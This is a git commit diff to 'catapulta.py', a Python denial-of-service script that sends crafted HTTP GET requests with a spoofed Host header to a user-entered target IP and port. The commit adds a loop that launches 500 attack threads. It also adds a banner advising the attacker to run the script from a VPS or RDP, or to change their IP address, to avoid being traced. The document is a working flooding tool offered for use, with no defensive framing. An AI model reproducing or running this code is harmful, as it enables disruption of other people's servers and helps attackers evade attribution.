ef7d09328c98dfcc75295354dfec5e424aa04218
V-M4K4R0V <ahmedelmountassir10@gmail.com>
2020-02-02 17:11:47 +0100

    attention_please

--- catapulta.py
+++ catapulta.py
@@ -5,6 +5,12 @@ import time
 #============target info================#
 zombie_IP = input("Enter your target IP : ")
 zombie_PORT = input("Enter the port : ")
+print('''
+|-------------------------ATTENTION------------------------------|
+|   1!= you'd better run this script on VPS or RDP               |
+|    2!= if u dont have one of them u should change your IP-add  |
+|----------------------------------------------------------------|
+''')
 
 #============Attack func================#
 def attack():
@@ -15,3 +21,8 @@ def attack():
         catapulta.sendto(("GET /" + zombie_IP + " HTTP/1.1\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
         catapulta.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
         catapulta.close()
+
+#============number of threads==========#
+for i in range(500):
+    N_0F_7 = threading.Thread(target=attack)
+    N_0F_7.start()
